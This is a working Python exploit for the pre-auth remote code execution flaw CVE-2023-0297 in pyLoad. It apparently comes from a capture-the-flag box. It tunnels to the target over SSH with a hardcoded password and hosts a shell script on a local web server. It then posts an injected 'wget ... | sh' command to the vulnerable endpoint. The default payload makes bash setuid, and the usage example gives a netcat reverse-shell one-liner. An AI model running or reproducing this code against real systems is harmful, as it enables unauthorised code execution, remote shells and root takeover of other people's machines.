#!/usr/bin/python3

import threading
import requests
import subprocess
import argparse
from time import sleep

def execute_payload():
    print("Hold tight... executing...")
    sleep(1)
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    url = f"http://127.0.0.1:{args.remote_port}/flash/addcrypted2"
    payload = f"wget -O - http://{args.local_ip}:{args.local_port}/boom.sh|sh"
    data = f'jk=pyimport%20os;os.system("{payload}");f=function%20f2(){{}};&package=xxx&crypted=AAAA&&passwords=aaaa'
    response = requests.post(url, headers=headers, data=data)
    print(response.text)
    print("Done.")
    exit()

def port_forward_using_ssh():
    ssh_command = ['sshpass', '-p', 'HereIsYourPassWord1431', 'ssh', 'sau@pc', '-N', '-L', f'{args.remote_port}:127.0.0.1:{args.remote_port}']
    subprocess.Popen(ssh_command)
    print("Portforwarding is alive")

def create_local_payload():
    print("Creating local payload")
    with open('boom.sh', 'w') as f:
        payload = f'''
        #!/usr/bin/bash
        {args.payload}
        '''
        f.write(payload)

def start_http_server():
    import http.server 
    with http.server.HTTPServer(("", args.local_port), http.server.SimpleHTTPRequestHandler) as server:
        server.serve_forever()
    print("Serving http for ever...")

def init_http_server():
    thread = threading.Thread(target=start_http_server)
    thread.start()
    pass


parser = argparse.ArgumentParser(description="Executes a bash command written in a local file. Make sure sshpass is installed. Using CVE-2023-0297: Pre-auth RCE in pyLoad.")
parser.add_argument("--payload", "-b", type=str, default="chmod u+s /usr/bin/bash", help="The command to write to the local payload file (default: chmod u+s /usr/bin/bash)")
parser.add_argument("--remote_ip", "-r", type=str, required=True, help="The vulnerable remote machine IP address")
parser.add_argument("--remote_port", "-p", type=int, default=9666, help="The vulnerable remote machine port number to forward (default: 9666)")
parser.add_argument("--local_ip", "-l", type=str, required=True, help="The local machine IP address to serve http on")
parser.add_argument("--local_port", "-lp", type=int, default=4443, help="The local machine port number to serve http on (default: 4443)")

parser.usage = "python script.py [-h] [--payload PAYLOAD] [--remote_ip REMOTE_IP] [--remote_port REMOTE_PORT] [--local_ip LOCAL_IP] [--local_port LOCAL_PORT]"
parser.usage += "\n\nExample: ./pyloader_rce.py -r 10.129.39.230 -l 10.10.14.104 -b 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.104 8002 >/tmp/f'"

args = parser.parse_args()

# gooooo
create_local_payload()
init_http_server()
port_forward_using_ssh()
execute_payload()